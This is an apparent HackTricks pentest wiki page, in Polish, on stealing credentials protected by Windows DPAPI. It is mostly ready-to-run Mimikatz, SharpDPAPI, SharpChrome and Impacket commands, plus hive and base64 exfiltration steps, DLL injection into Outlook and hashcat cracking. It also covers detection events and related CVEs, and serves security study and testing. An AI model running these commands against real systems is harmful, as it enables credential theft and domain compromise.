# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Czym jest DPAPI

Data Protection API (DPAPI) jest używane przede wszystkim w systemie operacyjnym Windows do **symetrycznego szyfrowania asymetrycznych kluczy prywatnych**, wykorzystując sekrety użytkownika lub systemu jako istotne źródło entropii. Takie podejście upraszcza szyfrowanie dla deweloperów, umożliwiając im szyfrowanie danych za pomocą klucza pochodzącego z sekretów logowania użytkownika lub — w przypadku szyfrowania systemowego — z sekretów uwierzytelniania domeny systemu, dzięki czemu deweloperzy nie muszą samodzielnie zarządzać ochroną klucza szyfrującego.

Najczęstszym sposobem korzystania z DPAPI jest użycie funkcji **`CryptProtectData` i `CryptUnprotectData`**, które pozwalają aplikacjom szyfrować i deszyfrować dane przy użyciu kontekstu bezpieczeństwa aktualnie zalogowanego procesu. Domyślnie dane mogą zostać odszyfrowane wyłącznie przez ten sam kontekst użytkownika lub systemu, który je zaszyfrował.<sup>[[2]](#references)[[3]](#references)</sup>

Funkcje te przyjmują również opcjonalny **parametr entropii**, używany podczas szyfrowania i deszyfrowywania. Dane chronione z użyciem opcjonalnej entropii wymagają tej samej wartości entropii do deszyfrowania.<sup>[[2]](#references)[[6]](#references)</sup>

### Generowanie klucza użytkownika

DPAPI wyprowadza wartość specyficzną dla użytkownika (często nazywaną **pre-key**) z poświadczeń użytkownika. Dokładny sposób wyprowadzania zależy od konta i wersji systemu operacyjnego. Na przykład Impacket próbuje ścieżki HMAC-SHA1 opartej na skrócie SHA-1 hasła w kodowaniu UTF-16LE, innej ścieżki opartej na hashu MD4/NT hasła oraz ścieżki opartej na PBKDF2-SHA256 dla Protected Users. Dlatego narzędzia offline często mogą wyprowadzić wymagany materiał zarówno z hasła w postaci jawnej, jak i z dostępnego hasha NT.<sup>[[2]](#references)[[10]](#references)</sup>

Jest to szczególnie interesujące, ponieważ jeśli attacker zdobędzie hash hasła użytkownika, może:

- **Odszyfrować dowolne dane zaszyfrowane za pomocą DPAPI** z użyciem klucza tego użytkownika, bez konieczności kontaktowania się z jakimkolwiek API
- Spróbować **złamać hasło** offline, próbując wygenerować prawidłowy klucz DPAPI

DPAPI utrzymuje jeden lub więcej **kluczy głównych** dla każdego użytkownika, zamiast tworzyć nowy klucz główny dla każdego chronionego bloba. Każdy klucz główny ma **GUID** (Globally Unique Identifier), a zaszyfrowany blob zapisuje informację o tym, który klucz główny go chroni.<sup>[[2]](#references)</sup>

Klucze główne są przechowywane w katalogu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gdzie `{SID}` oznacza Security Identifier użytkownika. Plik klucza głównego zawiera materiał chroniony za pomocą **pre-key** użytkownika oraz — w przypadku użytkowników domenowych — materiał odzyskiwania chroniony za pomocą **domain backup key**.<sup>[[2]](#references)</sup>

Należy pamiętać, że **klucz domeny używany do szyfrowania klucza głównego znajduje się na kontrolerach domeny i nigdy się nie zmienia**, więc jeśli attacker uzyska dostęp do kontrolera domeny, może pobrać domain backup key i odszyfrować klucze główne wszystkich użytkowników w domenie.<sup>[[2]](#references)</sup>

Zaszyfrowane bloby zawierają w swoich nagłówkach **GUID klucza głównego**, który został użyty do zaszyfrowania danych.

> [!TIP]
> Bloby zaszyfrowane przez DPAPI zaczynają się od **`01 00 00 00`**

Znajdź klucze główne:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Tak wygląda zestaw Master Keys użytkownika:

![Czym jest DPAPI - generowanie kluczy użytkownika: Tak wygląda zestaw Master Keys użytkownika](<../../images/image (1121).png>)

### Generowanie klucza Machine/System

Jest to klucz używany przez machine do szyfrowania danych. Bazuje na **DPAPI_SYSTEM LSA secret**, czyli specjalnym kluczu, do którego dostęp ma wyłącznie użytkownik SYSTEM. Klucz ten służy do szyfrowania danych, które muszą być dostępne dla samego systemu, takich jak credentials na poziomie machine lub secrets dostępne dla całego systemu.<sup>[[2]](#references)</sup>

Należy pamiętać, że te klucze **nie mają domain backup**, dlatego są dostępne wyłącznie lokalnie:

- **Mimikatz** może uzyskać do nich dostęp, wykonując dump LSA secrets za pomocą polecenia: `mimikatz lsadump::secrets`
- Secret jest przechowywany w rejestrze, więc administrator może **zmodyfikować uprawnienia DACL, aby uzyskać do niego dostęp**. Ścieżka rejestru to: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Możliwe jest również przeprowadzenie ekstrakcji offline z registry hives. Na przykład jako administrator na systemie docelowym zapisz hives i dokonaj ich exfiltration:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Następnie na swoim hoście analitycznym odzyskaj sekret LSA DPAPI_SYSTEM z hive'ów i użyj go do odszyfrowania blobów o zakresie maszyny (haseł zadań zaplanowanych, poświadczeń usług, profili Wi‑Fi itp.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
Przykład DPAPI dotyczący Veeam:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Dane chronione przez DPAPI

Do danych osobowych chronionych przez DPAPI należą:

- Windows creds
- Hasła i dane autouzupełniania w Internet Explorer i Google Chrome
- Hasła do kont e-mail i wewnętrznych kont FTP dla aplikacji takich jak Outlook i Windows Mail
- Hasła do folderów współdzielonych, zasobów, sieci bezprzewodowych i Windows Vault, w tym klucze szyfrowania
- Hasła do połączeń pulpitu zdalnego, .NET Passport oraz klucze prywatne do różnych celów szyfrowania i uwierzytelniania
- Hasła sieciowe zarządzane przez Credential Manager oraz dane osobowe w aplikacjach korzystających z CryptProtectData, takich jak Skype, MSN messenger i inne
- Zaszyfrowane bloby w rejestrze
- ...

Dane chronione przez system obejmują:
- Hasła Wi-Fi
- Hasła zadań zaplanowanych
- ...

### Opcje ekstrakcji klucza głównego

- Jeśli użytkownik ma uprawnienia domain admin, może uzyskać dostęp do **domain backup key**, aby odszyfrować wszystkie klucze główne użytkowników w domenie:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mając lokalne uprawnienia administratora, można **uzyskać dostęp do pamięci LSASS**, aby wyodrębnić klucze główne DPAPI wszystkich połączonych użytkowników oraz klucz SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Jeśli użytkownik ma uprawnienia lokalnego administratora, może uzyskać dostęp do **DPAPI_SYSTEM LSA secret**, aby odszyfrować główne klucze maszyny:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Jeśli znane jest hasło użytkownika lub jego hash NTLM, możesz **bezpośrednio odszyfrować klucze główne użytkownika**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Jeśli znajdujesz się w sesji użytkownika, możesz poprosić DC o **klucz zapasowy do odszyfrowania kluczy głównych za pomocą RPC**. Jeśli jesteś lokalnym administratorem, a użytkownik jest zalogowany, możesz w tym celu **ukraść jego token sesji**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Dostęp do danych zaszyfrowanych przez DPAPI

### Znajdowanie danych zaszyfrowanych przez DPAPI

Często chronione pliki użytkowników znajdują się w:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Sprawdź również, czy zamiana `\Roaming\` na `\Local\` w powyższych ścieżkach przyniesie rezultaty.

Przykłady enumeracji:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) może wyszukiwać zaszyfrowane przez DPAPI bloby w systemie plików, rejestrze i blobach B64:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Zauważ, że [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (z tego samego repo) może być używany do odszyfrowywania za pomocą DPAPI wrażliwych danych, takich jak cookies.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron quick recipes (SharpChrome)

- Bieżący użytkownik, interaktywne odszyfrowywanie zapisanych loginów/cookies (działa nawet z app-bound cookies w Chrome 127+, ponieważ dodatkowy klucz jest pobierany z Credential Manager użytkownika podczas działania w kontekście użytkownika):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Analiza offline, gdy masz tylko pliki. Najpierw wyodrębnij klucz stanu AES z pliku profilu „Local State”, a następnie użyj go do odszyfrowania bazy danych cookie:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/remote triage, gdy masz domain backup key DPAPI (PVK) i uprawnienia admin na hoście docelowym:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Jeśli masz prekey/credkey DPAPI użytkownika (z LSASS), możesz pominąć łamanie hasła i bezpośrednio odszyfrować dane profilu:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Uwagi
- Nowsze wersje Chrome/Edge mogą przechowywać niektóre cookies przy użyciu szyfrowania „App-Bound”. Offline decryption tych konkretnych cookies nie jest możliwe bez dodatkowego klucza app-bound; uruchom SharpChrome w kontekście docelowego użytkownika, aby pobrać go automatycznie. Zobacz wpis na blogu dotyczącym bezpieczeństwa Chrome, do którego odwołano się poniżej.<sup>[[5]](#references)</sup>

### Klucze dostępu i dane

- **Użyj SharpDPAPI**, aby pobrać credentials z plików zaszyfrowanych przez DPAPI w bieżącej sesji:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Uzyskaj informacje o credentials** takie jak zaszyfrowane dane i guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Uzyskiwanie dostępu do kluczy głównych**:

Odszyfruj klucz główny użytkownika żądającego **domain backup key** za pomocą RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Narzędzie **SharpDPAPI** obsługuje również te argumenty do deszyfrowania masterkey (zwróć uwagę, że można użyć `/rpc`, aby uzyskać klucz kopii zapasowej domeny, `/password`, aby użyć hasła w postaci plaintext, lub `/pvk`, aby określić plik prywatnego klucza domeny DPAPI...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Odszyfrowywanie danych przy użyciu klucza głównego**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Narzędzie **SharpDPAPI** obsługuje również te argumenty do deszyfrowania `credentials|vaults|rdg|keepass|triage|blob|ps` (zwróć uwagę, że można użyć `/rpc`, aby uzyskać domenowy klucz backup, `/password`, aby użyć hasła w postaci jawnego tekstu, `/pvk`, aby określić plik klucza prywatnego domeny DPAPI, oraz `/unprotect`, aby użyć sesji bieżącego użytkownika...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Używanie DPAPI prekey/credkey bezpośrednio (hasło nie jest wymagane)

Jeśli możesz zrzucić LSASS, Mimikatz często ujawnia klucz DPAPI dla danej sesji logowania, którego można użyć do odszyfrowania masterkeys użytkownika bez znajomości hasła w postaci jawnej. Przekaż tę wartość bezpośrednio do narzędzia:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Odszyfruj dane przy użyciu **bieżącej sesji użytkownika**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Deszyfrowanie offline za pomocą Impacket dpapi.py

Jeśli posiadasz SID i hasło użytkownika ofiary (lub hash NT), możesz całkowicie offline odszyfrować masterkeys DPAPI oraz bloby Credential Manager za pomocą dpapi.py z Impacket.<sup>[[10]](#references)[[11]](#references)</sup>

- Zidentyfikuj artefakty na dysku:
- Blob(y) Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
- Pasujący masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Jeśli narzędzia do transferu plików działają niestabilnie, zakoduj pliki w base64 na hoście i skopiuj wynik:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Odszyfruj klucz główny za pomocą identyfikatora SID użytkownika i hasła/skrótu:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Użyj odszyfrowanego klucza głównego do odszyfrowania bloku danych uwierzytelniających:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Ten workflow często odzyskuje dane uwierzytelniające domeny zapisane przez aplikacje za pomocą Windows Credential Manager, w tym konta administracyjne (np. `*_adm`).

---

### Obsługa opcjonalnej entropii („Third-party entropy”)

Niektóre aplikacje przekazują dodatkową wartość **entropy** do `CryptProtectData`. Bez tej wartości blob nie może zostać odszyfrowany, nawet jeśli znany jest prawidłowy masterkey. Uzyskanie wartości entropy jest więc niezbędne podczas atakowania danych uwierzytelniających chronionych w ten sposób (np. Microsoft Outlook, niektórzy klienci VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) to biblioteka DLL działająca w trybie user-mode, która hookuje funkcje DPAPI wewnątrz procesu docelowego i transparentnie rejestruje każdą dostarczoną opcjonalną wartość entropy. Uruchomienie EntropyCapture w trybie **DLL-injection** przeciwko procesom takim jak `outlook.exe` lub `vpnclient.exe` zapisze plik mapujący każdy bufor entropy z wywołującym go procesem i blobem. Przechwyconą wartość entropy można później przekazać do **SharpDPAPI** (`/entropy:`) lub **Mimikatz** (`/entropy:<file>`), aby odszyfrować dane.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft wprowadził format masterkey **context 3** począwszy od Windows 10 v1607 (2016). `hashcat` v6.2.6 (grudzień 2023) dodał tryby hash **22100** (DPAPI masterkey v1 context), **22101** (context 1) oraz **22102** (context 3), umożliwiając cracking haseł użytkowników bezpośrednio z pliku masterkey z wykorzystaniem GPU. Atakujący mogą zatem przeprowadzać ataki word-list lub brute-force bez interakcji z systemem docelowym.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatyzuje ten proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Narzędzie może również analizować bloby Credential i Vault, odszyfrowywać je za pomocą złamanych kluczy oraz eksportować hasła w postaci jawnego tekstu.<sup>[[8]](#references)</sup>


### Dostęp do danych innych maszyn

W **SharpDPAPI i SharpChrome** można podać opcję **`/server:HOST`**, aby uzyskać dostęp do danych zdalnej maszyny. Oczywiście musisz mieć możliwość uzyskania dostępu do tej maszyny, a w poniższym przykładzie zakłada się, że **klucz szyfrowania kopii zapasowej domeny jest znany**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Inne narzędzia

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) to narzędzie automatyzujące ekstrakcję wszystkich użytkowników i komputerów z katalogu LDAP oraz ekstrakcję klucza backupu kontrolera domeny za pośrednictwem RPC. Następnie skrypt rozwiązuje adresy IP wszystkich komputerów i wykonuje smbclient na każdym z nich, aby pobrać wszystkie bloby DPAPI wszystkich użytkowników i odszyfrować wszystko za pomocą klucza backupu domeny.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Dzięki liście komputerów wyekstrahowanej z LDAP możesz znaleźć każdą podsieć, nawet jeśli wcześniej o niej nie wiedziałeś!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) może automatycznie zrzucać sekrety chronione przez DPAPI. Wydanie 2.x wprowadziło:<sup>[[9]](#references)</sup>

* Równoległe zbieranie blobów z setek hostów
* Parsowanie kluczy głównych **context 3** oraz automatyczną integrację z łamaniem haseł Hashcat
* Obsługę zaszyfrowanych cookies Chrome „App-Bound” (zobacz następną sekcję)
* Nowy tryb **`--snapshot`** do wielokrotnego odpytywania endpointów i porównywania nowo utworzonych blobów

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) to parser w C# plików masterkey/credential/vault, który może generować formaty Hashcat/JtR i opcjonalnie automatycznie uruchamiać łamanie. W pełni obsługuje formaty kluczy głównych maszyn i użytkowników do Windows 11 24H1 włącznie.<sup>[[8]](#references)</sup>


## Typowe mechanizmy wykrywania

- Dostęp do plików w `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` oraz innych katalogów powiązanych z DPAPI.
- Szczególnie z udziałem udziału sieciowego, takiego jak **C$** lub **ADMIN$**.
- Użycie **Mimikatz**, **SharpDPAPI** lub podobnych narzędzi do uzyskania dostępu do pamięci LSASS albo zrzucenia kluczy głównych.
- Zdarzenie **4662**: *Wykonano operację na obiekcie* – można je skorelować z dostępem do obiektu **`BCKUPKEY`**.
- Zdarzenia **4673/4674**, gdy proces żąda uprawnienia *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Luki 2023-2025 i zmiany w ekosystemie

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (listopad 2023). Atakujący z dostępem do sieci mógł nakłonić członka domeny do pobrania złośliwego klucza backupu DPAPI, umożliwiając odszyfrowanie kluczy głównych użytkowników. Luka została załatana w zbiorczej aktualizacji z listopada 2023 – administratorzy powinni upewnić się, że kontrolery domeny i stacje robocze mają zainstalowane wszystkie aktualizacje.<sup>[[4]](#references)</sup>
* Szyfrowanie cookies „App-Bound” w **Chrome 127** (lipiec 2024) zastąpiło starszą ochronę opartą wyłącznie na DPAPI dodatkowym kluczem przechowywanym w **Credential Manager** użytkownika. Odszyfrowanie cookies w trybie offline wymaga teraz zarówno klucza głównego DPAPI, jak i **klucza app-bound opakowanego za pomocą GCM**. SharpChrome v2.3 i DonPAPI 2.x potrafią odzyskać dodatkowy klucz podczas działania w kontekście użytkownika.<sup>[[5]](#references)</sup>


### Studium przypadku: Zscaler Client Connector – custom entropy wyprowadzane z SID

Zscaler Client Connector przechowuje kilka plików konfiguracyjnych w `C:\ProgramData\Zscaler` (np. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Każdy plik jest szyfrowany za pomocą **DPAPI (Machine scope)**, ale dostawca używa **custom entropy**, które jest *obliczane w czasie wykonywania*, zamiast być przechowywane na dysku.<sup>[[1]](#references)</sup>

Entropy jest odbudowywane na podstawie dwóch elementów:

1. Sekretu zakodowanego na stałe w pliku `ZSACredentialProvider.dll`.
2. **SID** konta Windows, do którego należy konfiguracja.

Algorytm zaimplementowany w bibliotece DLL jest równoważny:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Ponieważ sekret jest osadzony w bibliotece DLL, którą można odczytać z dysku, **każdy lokalny atakujący z uprawnieniami SYSTEM może ponownie wygenerować entropy dla dowolnego identyfikatora SID** i odszyfrować bloby offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Deszyfrowanie zwraca kompletną konfigurację JSON, w tym każdy **device posture check** i jego oczekiwaną wartość – informacje niezwykle cenne podczas prób client-side bypassów.

> TIP: pozostałe zaszyfrowane artefakty (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) są chronione przez DPAPI **bez entropy** (`16` zerowych bajtów). Można je więc odszyfrować bezpośrednio za pomocą `ProtectedData.Unprotect` po uzyskaniu uprawnień SYSTEM.

## References

- [1] [Synacktiv – Czy można ufać swojemu zero trust? Omijanie posture checks w Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Sekrety DPAPI. Analiza bezpieczeństwa i odzyskiwanie danych w DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Odczytywanie zaszyfrowanych sekretów DPAPI za pomocą Mimikatz i C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 – podatność Windows DPAPI (Data Protection Application Programming Interface) typu Spoofing](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Poprawa bezpieczeństwa plików cookie Chrome w systemie Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: proste wyodrębnianie opcjonalnego entropy DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Informacje o wydaniu hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – repozytorium GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – strona projektu PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: nadużycie AD ACL, łamanie Argon2 KeePassXC i deszyfrowanie DPAPI prowadzące do uprawnień administratora DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – użycie i opcje](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
